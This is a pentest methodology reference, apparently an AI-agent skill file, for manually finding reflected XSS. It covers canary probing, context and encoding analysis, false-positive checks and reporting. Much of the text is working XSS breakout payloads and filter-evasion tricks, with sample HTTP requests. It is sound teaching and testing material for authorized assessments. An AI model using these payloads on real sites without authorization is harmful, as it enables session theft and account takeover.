# Reflected XSS — Manual Detection Methodology (OSWE Exam Style)

> **Purpose.** A repeatable, manual, evidence-driven workflow for detecting **reflected** cross-site scripting (XSS) in a web application, written for an OSWE-style (white-box / manual exploitation) engagement. No scanner output is trusted; every claim is backed by a raw request/response and a browser-confirmed execution.
>
> **Scope.** Reflected XSS only (server reflects attacker input in the HTTP response within the same request). Stored and DOM-only vectors are covered by sibling references; hybrid reflected→DOM chains are noted where relevant.
>
> **Rules of engagement.** Only test in-scope assets with written authorization. Use `alert(document.domain)` / `console.log` PoCs, not data-exfiltration or session theft, unless explicitly authorized. Mark every payload that writes or sends data.

---

## 0. Pre-flight: Scope, Baseline, Tooling

### 0.1 Authorization & target record
- [ ] Scope document lists in-scope hosts, paths, accounts, and allowed actions.
- [ ] Test accounts (low-priv, high-priv, unauthenticated) provisioned and credentials recorded.
- [ ] Burp Suite project created; scope filter set to in-scope hosts only.
- [ ] Out-of-band (OOB) callback domain ready (`interactsh-client` / Burp Collaborator) for blind confirmation.
- [ ] Browser profile with DevTools, no XSS-auditor/extension interference; note browser + version.

### 0.2 Tooling baseline
| Need | Tool |
|---|---|
| Proxy / Repeater | Burp Suite (Proxy, Repeater, Intruder, Logger++) |
| Parameter discovery | `arjun`, Burp **Param Miner**, `ffuf` |
| Crawling | Burp Spider, `katana`, `gau`, `waybackurls` |
| JS endpoint extraction | `LinkFinder`, `jsluice`, Burp JS Link Finder |
| OOB callback | `interactsh-client`, Burp Collaborator |
| Encoding/decoding | CyberChef, Burp Decoder |
| Evidence | Burp "Save items", screenshot tool, `curl` |

### 0.3 Baseline request (always first)
Before any payload, capture one **benign** request/response for the endpoint under test and record:
- HTTP status, `Content-Type`, `Content-Length`, response hash (SHA-256 of body).
- Presence of security headers: `Content-Security-Policy`, `X-Content-Type-Options`, `X-Frame-Options`, `Set-Cookie` flags (`HttpOnly`, `Secure`, `SameSite`).
- Whether the parameter value is reflected at all, and where.

> **Why.** Without a baseline, a `403`/`500` or length change cannot be attributed to the payload vs. WAF, cache, or server error.

---

## 1. Recon: Mapping Parameters, Headers, and Reflection Points

### 1.1 Enumerate entry points
- [ ] Crawl the application (authenticated + unauthenticated) and build the sitemap.
- [ ] Extract endpoints from JavaScript bundles (`/static/*.js`, `main.js`, `app.js`) — search for `fetch(`, `axios`, `XMLHttpRequest`, `$.ajax`, route definitions.
- [ ] Collect from `robots.txt`, `sitemap.xml`, OpenAPI/Swagger (`/swagger.json`, `/openapi.json`, `/api-docs`), GraphQL introspection.
- [ ] Harvest historical URLs: `gau target.com`, `waybackurls target.com`, Burp "Discover content".
- [ ] Note every HTTP method used per endpoint (GET/POST/PUT/PATCH/DELETE) and `Content-Type` (form, JSON, XML, multipart).

### 1.2 Map parameters (sources)
For each endpoint, enumerate **all** input channels, not just query strings:

| Channel | Examples | Where to look |
|---|---|---|
| Query string | `?q=`, `?search=`, `?id=` | URL |
| POST body (form) | `username=`, `comment=` | `application/x-www-form-urlencoded` |
| POST body (JSON) | `{"query":"..."}` | `application/json` |
| POST body (XML) | `<search>...</search>` | `application/xml`, SOAP |
| Multipart | `file`, `description` | `multipart/form-data` |
| Path segment | `/user/INPUT/profile` | RESTful routes |
| Headers | `User-Agent`, `Referer`, `X-Forwarded-For`, `X-Forwarded-Host`, `Cookie`, custom `X-*` | Request headers |
| Fragment | `#section` | Client-only (DOM sink) — note separately |

Tools:
```bash
# Parameter discovery (unauthenticated baseline)
arjun -u "https://target.example/search" -m GET
arjun -u "https://target.example/api/search" -m POST --json

# Fuzz parameter names
ffuf -u "https://target.example/search?FUZZ=canary" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc all -fs 0
```

Burp **Param Miner** → "Guess params" on each request in scope; review "Params" tab.

### 1.3 Identify reflection points (sinks on the server side)
A reflection point is any place the request value reappears in the response. Map them **per parameter**:

- [ ] Send a request with a unique token for **one** parameter at a time (keep others benign).
- [ ] Search the **raw response** (Burp "Response" → search) for the token.
- [ ] Record: location in response (HTML body, `<script>`, attribute, comment, header, JSON, error page), encoding applied, and whether it is the **only** reflection or one of many.

Burp workflow:
1. Proxy → HTTP history → right-click request → "Send to Repeater".
2. In Repeater, change one parameter value to a canary (§2).
3. Click "Send"; in the response pane, `Ctrl+F` the canary.
4. Right-click the reflected occurrence → "Copy as curl" / save to file for evidence.
5. Repeat for each parameter; use Burp "Compare" (right-click two responses) to spot reflections hidden in large pages.

Manual (curl) equivalent:
```bash
CANARY="xsstest_7f3a9b2c"
curl -s -i "https://target.example/search?q=${CANARY}" -o resp.txt
grep -n "$CANARY" resp.txt
```

### 1.4 Header reflection (often missed)
Headers are frequently reflected into pages (analytics, error pages, "You came from …", logging consoles):
```http
GET /dashboard HTTP/1.1
Host: target.example
User-Agent: xsstest_UA_7f3a9b2c
Referer: https://evil.example/xsstest_REF_7f3a9b2c
X-Forwarded-For: xsstest_XFF_7f3a9b2c
X-Forwarded-Host: xsstest_XFH_7f3a9b2c
Cookie: tracking=xsstest_CK_7f3a9b2c
```
Then search the response for each canary. Note which headers are reflected and in what context (HTML, JS, log viewer).

### 1.5 Build a reflection map
Produce a table before testing payloads:

| Endpoint | Method | Param/Header | Reflected? | Location in response | Encoding observed | Context |
|---|---|---|---|---|---|---|
| `/search` | GET | `q` | yes | HTML body, inside `<h2>` | none | HTML body |
| `/search` | GET | `q` | yes | `<script>var q="…"` | `"` → `\"`? | JS string |
| `/profile` | POST | `display_name` | yes | attribute `value="…"` | HTML entities | attribute |
| `/error` | GET | `next` | yes | `<meta http-equiv="refresh" content="0;url=…">` | none | URL/meta |

This map drives §3 and prevents re-testing the same dead ends.

---

## 2. The "Canary" Approach

### 2.1 Why a canary
A canary is a **unique, benign, high-entropy string** that cannot be confused with legitimate content, template text, or WAF responses. It lets you locate the exact reflection point and inspect the surrounding bytes (context + encoding) without triggering filters.

### 2.2 Canary construction rules
- Unique per parameter per request: `xsstest_<param>_<8 hex>` (e.g., `xsstest_q_7f3a9b2c`). Use a fresh value each round to defeat caching and to attribute reflections.
- Alphanumeric + underscore only (no metacharacters) so it survives naive filters and is easy to grep.
- Length 12–20 chars; long enough to be unique, short enough to fit length limits.
- Record the canary in the reflection map.

### 2.3 Probe request (single parameter)
```http
GET /search?q=xsstest_q_7f3a9b2c&lang=en HTTP/1.1
Host: target.example
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.9
Cookie: session=eyJhbGciOi... (test account)
Connection: close
```

Response (excerpt) — locate `xsstest_q_7f3a9b2c`:
```html
<h2>Results for: xsstest_q_7f3a9b2c</h2>
<script>
  var lastQuery = "xsstest_q_7f3a9b2c";
  renderResults(lastQuery);
</script>
<input type="hidden" name="q" value="xsstest_q_7f3a9b2c">
```
→ Three reflection points for one parameter: HTML body, JS string, attribute.

### 2.4 Determine context (inspect bytes around the canary)
Look at the **5–10 characters immediately before and after** the canary in the raw response:

| Surrounding bytes | Context | Required breakout |
|---|---|---|
| `>…CANARY…<` | HTML body | `<tag …>` or text node |
| `value="…CANARY…"` | Double-quoted attribute | close `"` then event handler / tag |
| `value='…CANARY…'` | Single-quoted attribute | close `'` |
| `value=…CANARY… ` (space then `>`) | Unquoted attribute | space / `>` |
| `"…CANARY…"` inside `<script>` | JS string (double) | close `"` + `;` + payload + `//` |
| `'…CANARY…'` inside `<script>` | JS string (single) | close `'` + `;` + payload + `//` |
| `` `…CANARY…` `` inside `<script>` | Template literal | close backtick + `${…}` or breakout |
| `url(…CANARY…)` in `<style>` | CSS | close `)` / `}` |
| `"q": "…CANARY…"` | JSON in HTML (`<script type="application/json">` or inline) | depends on consumer |
| `<!-- …CANARY… -->` | HTML comment | close `-->` |
| `<title>…CANARY…</title>` | Title element | close `</title>` then tag |
| `textarea`/`title`/`noscript`/`iframe` raw text | RCDATA | close the element first |

### 2.5 Determine encoding (compare input vs. reflected bytes)
Send a canary containing metacharacters **once**, only after the plain canary is located, to see how each char is transformed:

Probe value: `xsstest_<>"'&/` (URL-encoded in request as needed).

Compare reflected form:

| Input char | Reflected as | Meaning |
|---|---|---|
| `<` | `<` | No encoding → HTML context injectable |
| `<` | `&lt;` | HTML entity encoding → not injectable in HTML body (but check JS/URL contexts) |
| `"` | `\"` | JS escaping → must break JS escaping first |
| `"` | `&quot;` | HTML entity in attribute |
| `'` | `\'` | JS escaping |
| `\` | `\\` | backslash escaping |
| `<` | `\x3c` / `\u003c` | Unicode/hex JS escaping → may still be injectable if unescaped later |
| `<` | removed | stripping filter → try split/concatenation (§5) |
| `<` | `%3C` | URL-encoded in response (rare; check if browser decodes) |

Record the **encoding matrix** per reflection point. This is the single most important artifact for deciding exploitability.

### 2.6 Context confirmation via browser (not just grep)
- [ ] Copy the reflected response into a local file or use Burp "Render" tab; verify the canary appears in the rendered DOM at the expected node.
- [ ] Open DevTools → Elements; inspect the node. Note whether the value is in an attribute, text node, or script.
- [ ] If the response is `application/json`, check whether it is consumed by `innerHTML`/`eval`/template later (reflected-DOM hybrid) — see `xss-dom-reflected-hybrid-oswe.md`.

---

## 3. Step-by-Step Manual Testing Workflow

### Phase A — Parameter discovery
1. [ ] Crawl + JS extraction + historical URLs (§1.1).
2. [ ] Run `arjun`/Param Miner on every endpoint; add discovered params to the map.
3. [ ] For REST paths, fuzz path segments (`/api/users/FUZZ`).
4. [ ] Record method + Content-Type + auth requirement per endpoint.

### Phase B — Reflection mapping (canary)
For each endpoint × parameter:
1. [ ] Send request with unique canary for that parameter only.
2. [ ] Search raw response; if found, record location + encoding (§2.4, §2.5).
3. [ ] If not found, try: different method, different Content-Type, parameter in body vs. query, uppercase/lowercase param name, array notation (`q[]`), duplicate params.
4. [ ] If still not found, mark "no reflection" and move on (do not assume safe; stored/second-order possible).

### Phase C — Context classification
For each reflection point:
1. [ ] Classify context (HTML body / attribute / JS string / URL / CSS / JSON / comment / RCDATA).
2. [ ] Classify encoding (none / HTML entity / JS escape / URL / stripped / transformed).
3. [ ] Decide candidate payload family from the table in §4.3.

### Phase D — Payload crafting & first probe
1. [ ] Start with the **minimal** payload for the context (not a polyglot).
2. [ ] Send via Repeater; inspect raw response: is the payload intact, partially, or blocked (`403`/`406`/WAF page)?
3. [ ] If intact in a breakable context → go to Phase E. If mangled → §5. If blocked → `waf-evasion-methodology` / `payload-encoding-evasion.md`.

### Phase E — Browser confirmation (execution, not reflection)
1. [ ] Reconstruct the full URL/request that produces the reflected payload.
2. [ ] Open in the test browser (authenticated session if required).
3. [ ] Confirm execution: `alert(document.domain)` fires, or DevTools console shows the log, or a callback hits `interactsh`.
4. [ ] Verify it is **not** a false positive: check DevTools Elements to ensure the script actually parsed (not displayed as text).
5. [ ] Re-run 2× from a clean state; record both results.

### Phase F — Impact & chaining
1. [ ] Determine cookie flags: is the session cookie `HttpOnly`? If not → session theft possible.
2. [ ] Check CSP: does it block inline scripts? If `unsafe-inline` or nonce reuse → still exploitable.
3. [ ] Check SameSite on cookies: `None`/missing → cross-site delivery possible; `Lax`/`Strict` → requires top-level navigation or same-site.
4. [ ] Test as a different user/role to confirm (for stored/hybrid) and to assess privilege impact.
5. [ ] Document chain (XSS → CSRF token theft → account takeover, etc.).

### Phase G — Reporting (§6)

---

## 4. Distinguishing Reflected XSS vs. False Positives

### 4.1 "Reflected" ≠ "Executable"
A value appearing in the response is **not** XSS until it executes in a browser context. Common false positives:

| Observation | Why it is not (yet) XSS | Next step |
|---|---|---|
| Payload printed inside `<!-- … -->` | Comment; not parsed as markup | Close comment first: `--><svg onload=alert(1)>` |
| Payload inside `<textarea>`/`<title>`/`<noscript>` | RCDATA; tags treated as text | Close element: `</textarea><svg onload=alert(1)>` |
| Payload HTML-entity encoded (`&lt;script&gt;`) | Browser renders as text | Try other contexts (JS string, URL) or bypass encoding |
| Payload inside a JS string but quotes escaped (`\"`) | String not broken | Break escaping: `\";alert(1)//` (if backslash not escaped) |
| Payload in JSON response only | Not rendered as HTML unless consumed by sink | Check client code for `innerHTML`/`eval` of that JSON |
| Payload in `Content-Disposition: attachment` | Downloaded, not rendered | Not exploitable as XSS (note as info) |
| Payload in error page with `500` | May be WAF/error template; check if stable | Reproduce; verify execution |
| Payload reflected in HTTP response header (`Location`, `Set-Cookie`) | Header injection / CRLF, not body XSS | Separate class (CRLF injection) |
| `alert` text shown but as a string literal in source | No execution | Confirm via DevTools / callback |
| Cached response served to other users | Cache poisoning, not reflected XSS | Handle under cache poisoning scope |

### 4.2 Encoding types and how to test each

**HTML entity encoding** (`<` → `&lt;`, `"` → `&quot;`):
- In HTML body/attribute: not exploitable directly.
- Check whether encoding is applied in **all** reflection points; sometimes one point encodes and another does not.
- Check for double-decoding: server decodes once, client decodes again (e.g., `&amp;lt;` → `&lt;` → `<`).

**JavaScript escaping** (`"` → `\"`, `'` → `\'`, `\` → `\\`, newline → `\n`, `<` → `\x3c`/`\u003c`):
- Single-quote break: if only `'` is escaped as `\'` but `\` is not escaped, send `\'` → `\\'` closes string: `\'-alert(1)//`.
- Double-quote break: analogous with `\"`.
- Hex/unicode escape: `\x3c` is a literal `<` only after JS unescape; if the value is later written via `innerHTML`, it may decode. Test `</script><script>alert(1)</script>` encoded as `\x3c/script\x3e...` only if the sink unescapes.
- Template literal: backtick and `${}`; if backticks not escaped, break with `` ` `` + `${alert(1)}`.

**URL encoding** (`%3C`):
- If reflected URL-encoded in an HTML attribute that is itself URL-decoded by the browser (e.g., `href`), `%3C` may become `<` after navigation. Test `javascript:` URIs and `%253C` (double encoding).

**Stripping / removal** (filter deletes `<script>`):
- Try case variation, nesting (`<scr<script>ipt>`), splitting across params (§5), alternative tags (`<svg>`, `<img>`, `<iframe srcdoc>`).

**Sanitization (DOMPurify, etc.)**:
- Check version; known bypasses (mXSS, namespace confusion). If server-side, test mutation XSS (`<noscript><p title="</noscript><img src=x onerror=alert(1)>">`).

### 4.3 Context → minimal payload table

| Context | Minimal probe | Breakout payload |
|---|---|---|
| HTML body | `<xsstest>` | `<svg onload=alert(document.domain)>` |
| Double-quoted attr | `" xsstest` | `" onmouseover="alert(document.domain)` (or ` " autofocus onfocus="alert(1)`) |
| Single-quoted attr | `' xsstest` | `' onmouseover='alert(document.domain)` |
| Unquoted attr | ` xsstest` | ` x onmouseover=alert(document.domain)` |
| JS string (double) | `";//` | `";alert(document.domain)//` |
| JS string (single) | `';//` | `';alert(document.domain)//` |
| JS template literal | `` ` `` | `` `;alert(document.domain)// `` or `${alert(document.domain)}` |
| URL / href | `javascript:alert(1)` | `javascript:alert(document.domain)` (check `javascript:` filter) |
| CSS | `}` | `}</style><svg onload=alert(1)>` |
| HTML comment | `-->` | `--><svg onload=alert(1)>` |
| RCDATA (textarea/title) | `</textarea>` | `</textarea><svg onload=alert(1)>` |
| Meta refresh URL | `javascript:` | `<meta … content="0;url=javascript:alert(1)">` (if reflected into content) |

### 4.4 Execution verification checklist
- [ ] Payload present **intact** in raw response (grep).
- [ ] Browser renders and executes (alert/callback).
- [ ] DevTools Elements shows the injected node in the DOM (not escaped text).
- [ ] DevTools Console has no CSP violation (or if violation, document it — may still be exploitable via allowed origin).
- [ ] Reproduced 2× from clean state (new session / incognito) with identical result.
- [ ] Not a cached response (check `Age`, `X-Cache`, `Cache-Control`; use cache-busting query param).

---

## 5. Partial Reflections, Multi-Part Reflections, and Concatenation

### 5.1 Partial reflection
Only a fragment of the input survives (filter strips tags, truncates length, removes characters).

**Detection:**
- Send a long canary with distinct segments: `AAA...<BBB>...CCC` (e.g., `xsstest_PREFIX_<tag>_SUFFIX_7f3a9b2c`).
- Compare input vs. reflected; identify which segments survive and in what order.

**Exploitation strategies:**
- If `<script>` is stripped but event handlers survive → use `<svg onload=…>` or `<img src=x onerror=…>`.
- If `alert` is stripped → use `confirm`, `prompt`, `top['al'+'ert']`, `window['alert']`.
- If `()` stripped → tagged template: `` alert`1` ``.
- If length truncated → split payload across **two** parameters that are concatenated server-side (§5.3), or use short payloads (`<svg/onload=alert(1)>`).
- If certain chars removed (`<`, `>`) → try HTML without angle brackets where possible (attribute injection without closing tag), or use existing tags on the page (DOM clobbering).

### 5.2 Multi-part reflection
The same parameter (or several) is reflected in **multiple locations** with **different** encoding. This is common and is both a trap and an opportunity.

Example: `/search?q=xsstest`
Response:
```html
<h2>xsstest</h2>                       <!-- point 1: HTML body, no encoding -->
<script>var q = "xsstest";</script>     <!-- point 2: JS string, quotes escaped -->
<input value="xsstest">                 <!-- point 3: attribute, HTML-encoded -->
```

**Workflow:**
- [ ] Map **every** reflection point for the parameter (§1.3); do not stop at the first.
- [ ] Classify encoding per point (§2.5).
- [ ] Prefer the **least-encoded** point for exploitation; if all are encoded, check for a point where encoding differs (e.g., one point HTML-encodes but another does not).
- [ ] If multiple points are exploitable, choose the one that gives the cleanest execution and fewest side effects.
- [ ] Beware: a payload that works at point 1 may break the page at point 2 (syntax error in JS). Test the **full page** renders correctly after injection (no console errors) — a broken page may still execute your payload but looks like a failed attempt; conversely a "successful" alert on a broken page is still valid but document side effects.

**Multi-parameter reflection** (different params reflected in different spots):
- [ ] Send canaries for `q` and `lang` simultaneously; locate both.
- [ ] Combine: put the breakout in one param and the execution in another if concatenation occurs (§5.3).

### 5.3 Concatenation / server-side joining
The application concatenates inputs before reflecting: `firstName + " " + lastName`, or `prefix + userInput + suffix`, or array join.

**Detection:**
- Send `q=AAA` and observe `…AAA…` plus surrounding fixed text.
- Send `q=AAA` and a second param `suffix=BBB` where the response shows `AAABBB` or `AAA BBB`.
- Use distinct markers: `q=LEFTMARKER`, `q2=RIGHTMARKER`; check if they appear adjacent: `LEFTMARKERRIGHTMARKER`.
- Test array notation: `q[]=a&q[]=b` may be joined by `,` or rendered as array.

**Exploitation:**
- Split the payload across the concatenated parts so that individually they look benign but together form executable markup:
  ```
  q=<svg onlo   (param 1, in "prefix")
  q2=ad=alert(1)> (param 2, in "suffix")
  → reflected: <svg onload=alert(1)>
  ```
- If a fixed separator is inserted (space, comma), incorporate it: payload parts separated by the separator must still form valid syntax, or use the separator as whitespace (space is valid in HTML tags).
- If case transformation is applied (`.toLowerCase()`, `.toUpperCase()`), build payloads that survive case change: HTML tags/attributes are case-insensitive; JS is not — prefer HTML-body context. `JAVASCRIPT:` URIs are case-insensitive in some browsers for the scheme; test.
- If a substring is extracted (`substr(0,50)`), ensure the executable portion fits within the window; place payload early.

### 5.4 Transformation matrix (record per point)
| Transformation | Survives? | Payload implication |
|---|---|---|
| None | yes | direct |
| Lowercase | HTML ok, JS broken | use HTML context |
| Uppercase | HTML ok, JS broken | use HTML context |
| Truncation (N chars) | partial | shorten or split |
| Whitespace collapse | multi-space → one | avoid relying on spaces; use `/` or tab |
| Tag stripping | partial | alternate tags/handlers |
| Quote stripping | partial | unquoted context or JS without quotes |
| Newline → `<br>` | partial | avoid newlines |

---

## 6. Reporting: Evidence Capture, Reproduction Steps, Impact

### 6.1 Evidence to capture (minimum)
- [ ] **Raw request** (full, including headers and cookies redacted appropriately) — Burp "Copy as curl" or saved item.
- [ ] **Raw response** (full) with the reflected payload visible.
- [ ] **Screenshot of execution**: browser showing `alert(document.domain)` or DevTools console/network callback, with URL bar visible.
- [ ] **Screenshot of DevTools Elements** showing the injected node in the DOM.
- [ ] **HTTP headers** of the response: `Content-Type`, `CSP`, `Set-Cookie` flags, cache headers.
- [ ] **Browser + version** used for confirmation.
- [ ] **Account/role** used (and whether it reproduces as another user).
- [ ] **Timestamp (UTC)** and target host.

Store evidence in a per-finding folder: `evidence/XSS-001/` with `request.txt`, `response.txt`, `exec.png`, `dom.png`.

### 6.2 Reproduction steps (write so a third party can repeat)
Template:
```
1. Log in as test user (credentials: <role>, account <id>) — or "unauthenticated".
2. Open the following URL in a fresh browser session:
   https://target.example/search?q=%3Csvg%20onload%3Dalert(document.domain)%3E
3. Observe an alert dialog displaying "target.example".
4. (Optional) Open DevTools → Elements to confirm the <svg> node is present in the DOM.
```
- Use the **shortest** URL that reproduces; URL-encode as needed but also provide the decoded payload.
- State preconditions (auth, specific page state, CSRF token if needed).
- State expected vs. actual result.

### 6.3 Impact statement
Tie the finding to concrete impact; avoid "XSS exists" alone. Consider:
- **Session theft**: if session cookie lacks `HttpOnly`, payload can exfiltrate `document.cookie` to an attacker-controlled endpoint.
- **Account takeover**: if XSS is on an authenticated page and cookies are readable, or if the app uses bearer tokens in `localStorage`.
- **CSRF bypass**: XSS can read CSRF tokens and perform state-changing actions as the victim (email change, password reset, fund transfer).
- **Privilege escalation**: if an admin views attacker-controlled content (stored/hybrid), XSS runs in admin context.
- **Phishing / UI redressing**: inject fake login forms.
- **Worm propagation**: if stored in a social feature.
- **CSP status**: if CSP blocks inline scripts, impact may be reduced to DOM manipulation only — state this honestly.

Example impact line:
> "An unauthenticated attacker can craft a URL that, when visited by an authenticated user, executes JavaScript in the victim's session. Because the session cookie `sessionid` is not marked `HttpOnly`, the payload can exfiltrate it to an attacker-controlled server, enabling full account takeover. The application's CSP does not restrict `script-src`, so no bypass is required."

### 6.4 Remediation & retest
- **Remediation**: context-aware output encoding at the point of rendering (HTML body, attribute, JS, URL, CSS); use framework auto-escaping; sanitize rich HTML with an up-to-date DOMPurify; set `HttpOnly`, `Secure`, `SameSite` on cookies; deploy a strict CSP (`script-src 'nonce-…'` or `'self'`, no `unsafe-inline`/`unsafe-eval`).
- **Retest**: repeat §3 Phases B–E with the same canary/payload; confirm the payload is now encoded or blocked and does not execute; verify no regression in functionality.

### 6.5 Report entry template
```markdown
## XSS-001 — Reflected XSS in search parameter `q`

- **Severity:** Medium/High (CVSS 3.1: AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N) — adjust.
- **Endpoint:** `GET https://target.example/search`
- **Parameter:** `q` (query string)
- **Context:** HTML body (unencoded)
- **Encoding:** none
- **CSP:** none / `default-src 'self'` (no script-src)
- **Cookie flags:** session cookie not HttpOnly

### Description
The `q` parameter is reflected in the HTML body without output encoding, allowing injection of arbitrary markup and script execution.

### Proof of Concept
Request:
```http
GET /search?q=%3Csvg%20onload%3Dalert(document.domain)%3E HTTP/1.1
Host: target.example
Cookie: session=...
```
Response (excerpt):
```html
<h2>Results for: <svg onload=alert(document.domain)></h2>
```
Browser: alert dialog shows `target.example`.

### Impact
...

### Remediation
...

### Retest
Re-send the PoC; confirm `&lt;svg...` in response and no alert.
```

---

## Appendix A — Master Checklist (AI agent runnable)

```
RECON
[ ] Crawl + JS endpoints + historical URLs
[ ] Param discovery (arjun/Param Miner) per endpoint
[ ] Header reflection probe (UA/Referer/XFF/XFH/Cookie)
[ ] Build reflection map (endpoint, param, location, encoding)

CANARY
[ ] Unique canary per param per request
[ ] Locate in raw response; classify context
[ ] Metachar probe to build encoding matrix
[ ] Browser render check

WORKFLOW
[ ] Phase A param discovery
[ ] Phase B reflection mapping
[ ] Phase C context classification
[ ] Phase D payload probe
[ ] Phase E browser confirmation (2x, clean state, cache check)
[ ] Phase F impact & chaining (HttpOnly, CSP, SameSite, cross-user)
[ ] Phase G reporting

FALSE-POSITIVE GUARDS
[ ] Confirm execution, not just reflection
[ ] Check encoding at every reflection point
[ ] Check RCDATA/comment/JSON contexts
[ ] Check cache (Age/X-Cache)
[ ] Check CSP console for violations

PARTIAL/MULTI/CONCAT
[ ] Segment canary to find surviving fragments
[ ] Map all reflection points per param
[ ] Test combined params for concatenation
[ ] Record transformation matrix

REPORTING
[ ] Raw request + response saved
[ ] Exec + DOM screenshots
[ ] Repro steps (shortest URL)
[ ] Impact statement (cookie flags, CSP, privilege)
[ ] Remediation + retest criteria
```

## Appendix B — Example HTTP Requests

### B.1 Baseline (benign)
```http
GET /search?q=hello&lang=en HTTP/1.1
Host: target.example
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.9
Cookie: session=eyJhbGciOiJIUzI1NiJ9...
Connection: close
```

### B.2 Canary probe (single parameter)
```http
GET /search?q=xsstest_q_7f3a9b2c&lang=en HTTP/1.1
Host: target.example
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36
Accept: text/html,application/xhtml+xml
Cookie: session=eyJhbGciOiJIUzI1NiJ9...
Connection: close
```

### B.3 Metacharacter encoding probe
```http
GET /search?q=xsstest_q_%3C%3E%22%27%26%2F HTTP/1.1
Host: target.example
Cookie: session=eyJhbGciOiJIUzI1NiJ9...
Connection: close
```
(Decoded value: `xsstest_q_<>"'&/`)

### B.4 Header reflection probe
```http
GET /dashboard HTTP/1.1
Host: target.example
User-Agent: xsstest_UA_7f3a9b2c
Referer: https://evil.example/xsstest_REF_7f3a9b2c
X-Forwarded-For: xsstest_XFF_7f3a9b2c
X-Forwarded-Host: xsstest_XFH_7f3a9b2c
Cookie: session=...; tracking=xsstest_CK_7f3a9b2c
Connection: close
```

### B.5 POST form reflection
```http
POST /profile/update HTTP/1.1
Host: target.example
Content-Type: application/x-www-form-urlencoded
Content-Length: 46
Cookie: session=...

display_name=xsstest_dn_7f3a9b2c&bio=hello
```

### B.6 POST JSON reflection
```http
POST /api/search HTTP/1.1
Host: target.example
Content-Type: application/json
Content-Length: 40
Cookie: session=...

{"query":"xsstest_q_7f3a9b2c","limit":10}
```

### B.7 Confirmed XSS (HTML body context)
```http
GET /search?q=%3Csvg%20onload%3Dalert(document.domain)%3E HTTP/1.1
Host: target.example
Cookie: session=...
Connection: close
```
Response excerpt:
```html
<h2>Results for: <svg onload=alert(document.domain)></h2>
```

### B.8 Confirmed XSS (JS string context)
```http
GET /search?q=%22%3Balert(document.domain)%2F%2F HTTP/1.1
Host: target.example
Cookie: session=...
Connection: close
```
(Decoded: `";alert(document.domain)//`)
Response excerpt:
```html
<script>var lastQuery = "";alert(document.domain)//";</script>
```

### B.9 Confirmed XSS (attribute context)
```http
GET /search?q=%22%20autofocus%20onfocus%3Dalert(document.domain) HTTP/1.1
Host: target.example
Cookie: session=...
Connection: close
```
Response excerpt:
```html
<input type="text" value="" autofocus onfocus=alert(document.domain)>
```

### B.10 Multi-part / concatenation probe
```http
GET /greet?first=xsstest_LEFT&last=xsstest_RIGHT HTTP/1.1
Host: target.example
Cookie: session=...
Connection: close
```
Look for `xsstest_LEFTxsstest_RIGHT` or `xsstest_LEFT xsstest_RIGHT` in response; then split payload across `first`/`last`.

### B.11 Cache-busting confirmation (avoid false positive from cache)
```http
GET /search?q=%3Csvg%20onload%3Dalert(document.domain)%3E&cb=987654321 HTTP/1.1
Host: target.example
Cache-Control: no-cache
Pragma: no-cache
Cookie: session=...
Connection: close
```

---

## Appendix C — References & Tools
- PortSwigger Web Security Academy — Cross-site scripting.
- OWASP WSTG-CLNT-01 (Testing for Reflected Cross Site Scripting).
- OWASP XSS Prevention Cheat Sheet (context-aware encoding).
- `web-pentest-payloads` skill → `references/xss.md`, `references/payload-encoding-evasion.md`, `references/oob-and-detection.md`.
- `waf-evasion-methodology` skill (when payloads are blocked).
- `xss-dom-reflected-hybrid-oswe.md` (reflected→DOM hybrid chains).
- Tools: Burp Suite, `arjun`, `ffuf`, `dalfox`, `xsstrike`, `interactsh-client`.

---

## Best Practices
- One parameter, one canary, one request — never mix probes; attribution is everything.
- Map **all** reflection points before crafting payloads; the first reflection is rarely the best.
- Confirm **execution in a browser**, not just presence in the response; cached/WAF/error pages produce false positives.
- Record the encoding matrix per point; it is the deliverable that makes the finding reproducible.
- Prefer minimal, context-specific payloads over polyglots; polyglots are for exploration, not proof.
- Be honest about CSP and cookie flags in the impact statement; an XSS that cannot steal sessions is still XSS but with different severity.
- Keep payloads non-destructive (`alert`/`console.log`/OOB ping) unless explicitly authorized.
- Retest after remediation with the original PoC; a fix that only blocks the exact payload is not a fix.
